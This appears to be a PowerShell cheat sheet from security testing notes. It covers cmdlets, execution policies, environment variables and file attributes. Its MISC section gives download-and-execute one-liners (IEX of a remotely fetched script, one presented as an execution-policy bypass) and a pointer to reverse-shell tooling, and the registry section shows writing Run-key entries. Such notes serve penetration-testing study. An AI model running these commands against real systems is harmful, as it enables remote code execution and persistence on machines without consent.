# PowerShell

## PowerShell Cmdlets

### The Three Core Cmdlets in PowerShell <a id="the-three-core-cmdlets-in-powershell"></a>

* `Get-Command`
* `Get-Help`
* `Get-Member`

## Check the Version of PowerShell

```text
$PSVersionTable
```

## Script Execution Policy

| Policy | Description |
| :--- | :--- |
| **AllSigned** | All .ps1 files must be digitally signed. PowerShell prompts the user to determine if files from the signing publisher should be run. |
| **Bypass** | Bypasses checks for whether files are signed, and internet origin is not verified. |
| **Default** | The default policies are Restricted \(client systems\) or RemoteSigned \(Server 2016+\) |
| **RemoteSigned** | All .ps1 files originating from the internet must be digitally signed. PowerShell prompts the user to determine if files from the signing publisher should be run. Allows local scripts and remote scripts if they are signed. |
| **Restricted** | All .ps1 files are blocked.  |
| **Undefined** | There is no execution policy set in the current scope. Reverts to Default policy. |

To view current execution policy check use the cmdlet `Get-ExecutionPolicy`.  If no execution policy is set in any scope, the effective execution policy is **Restricted,** which is the default for client systems \(Windows 10\) or **RemoteSigned** \(Server 2016+\). ****The policy can be changed with the cmdlet `Set-ExecutionPolicy <PolicyName>`. 

{% hint style="success" %}
For**`Execution-Policy`** bypass methods for privilege escalation and so on see [this section](windows/privilege-escalation.md#script-execution-policy-bypass-methods).
{% endhint %}

## Environment Variables

{% tabs %}
{% tab title="PowerShell" %}
Show all current environment variables in PowerShell: `Get-ChildItem Env:`
{% endtab %}

{% tab title="cmd.exe" %}
Show all current environment variables in cmd.exe: `set`
{% endtab %}
{% endtabs %}

You can assign values to Environment Variables without using a cmdlet using the following syntax:

```text
$Env:<variable> = "<value>"
```

You can also use the 'Item' cmdlets, such as `Set-Item`, `Remove-Item`, and `Copy-Item` to change the values of environment variables. For example, to use the `Set-Item` cmdlet to append `;C:\Windows\Temp` to the value of the `$Env:PATH` environment variable, use the following syntax:

```text
Set-Item -Path Env:PATH -Value ($Env:Path + ";C:\Windows\Temp")
```

{% hint style="info" %}
In this command, the value **`$Env:Path + ";C:\Windows\Temp"`** is enclosed in parentheses so that it is interpreted as a single unit.
{% endhint %}

### Adding a Folder to PATH

{% tabs %}
{% tab title="Windows" %}
To append `C:\Windows\Temp` to the PATH , use the following syntax \(note the \(`;`\) separator\):

```text
$Env:PATH += ";C:\Windows\Temp"
```
{% endtab %}

{% tab title="Linux/MacOS" %}
On Linux or MacOS, the colon \(`:`\) in the command separates each path in the list.

```text
$Env:PATH += ":/temp"
```
{% endtab %}
{% endtabs %}

#### Using System.Environment methods <a id="using-systemenvironment-methods"></a>

The **System.Environment** class provides **GetEnvironmentVariable** and **SetEnvironmentVariable** methods that allow you to specify the scope of the variable.

The following example uses the **GetEnvironmentVariable** method to get the machine setting of `PSModulePath` and the **SetEnvironmentVariable** method to add the `C:\Program Files\Fabrikam\Modules` path to the value.PowerShellCopy

```text
$path = [Environment]::GetEnvironmentVariable('PSModulePath', 'Machine')
$newpath = $path + ';C:\Program Files\Fabrikam\Modules'
[Environment]::SetEnvironmentVariable("PSModulePath", $newpath, 'Machine')
```

## MISC

{% tabs %}
{% tab title="Windows" %}
PowerShell.exe full path: `C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe`
{% endtab %}

{% tab title="Linux/MacOS" %}
PowerShell.exe full path: `/usr/local/microsoft/powershell/7/`
{% endtab %}
{% endtabs %}

Get tons of computer info in PowerShell: `Get-ComputerInfo`

Fully PowerShell version of `wget`. Retrieve file and execute remote code after downloading:

```text
powershell "Invoke-Expression(New-Object Net.Webclient).downloadString('http://<ip>:<port>/<filename>')"
```

Can also use `wget https://zweilosec.gitbook.io/hackers-rest -OutFile C:\Windows\Temp\out.html` to save the file to the local machine.  `wget` is an alias for `Invoke-WebRequest`. Adding `-Outfile` is needed to save the file to disk.

PowerShell Script Execution Bypass: \[can embed in php too! TODO: write script example of this\]:

```text
Echo IEX(New-Object Net.WebClient).DownloadString(http://<ip:port/filename.ps1>) | PowerShell -NoProfile -
```

PowerShell reverse shell and exploit scripts: `nishang` To learn how to use this tool check out Ippsec's video on youtube: [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE)

### Modifying the Registry

add a new key to registry  `New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name <key_name>` then set its properties with  `New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name <key_name> -Value "<key_value>"`To edit a value that is already set use `Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name <key_name> -Value "<new_value>"`

### Change file attributes

This can also be used to change file property flags such as Hidden, Archive, and ReadOnly.

```text
$file = (Get-ChildItem <file>) #can shorten command with gci or ls
$file.attributes #Show the files attributes
Normal

#Flip the bit of the Hidden attribute
$file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
$file.attributes
Hidden

#To remove the 'Hidden' attribute
$file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
$file.attributes
Normal
```

## Resources

* [http://vcloud-lab.com/Microsoft](http://vcloud-lab.com/Microsoft)
* [http://go.microsoft.com/fwlink/?LinkID=135170](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7)

